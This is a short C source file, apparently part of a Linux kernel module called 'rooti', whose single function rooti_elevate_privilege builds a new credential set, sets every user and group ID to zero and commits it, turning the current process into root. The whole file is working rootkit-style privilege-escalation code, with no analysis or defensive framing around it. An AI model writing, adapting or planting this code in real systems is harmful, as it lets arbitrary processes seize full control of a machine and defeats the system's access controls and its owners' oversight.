#include <linux/cred.h>
#include "pe.h"

/*
    Escalates the privilege of the current process in execution to root user & group.
    On failure, returns a negative error code, otherwise, returns 0.
*/
int rooti_elevate_privilege()
{
    // Prepare new set of credentials
    struct cred *creds = prepare_creds();
    if (creds == NULL) {
        printk(KERN_DEBUG "rooti: prepare_creds() failed, out of memory\n");
        return -ENOMEM;
    }

    // Modify credentials to those of root user & group
    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    // Commit new set of credentials in the context of the process in execution
    commit_creds(creds);

    return 0;
}
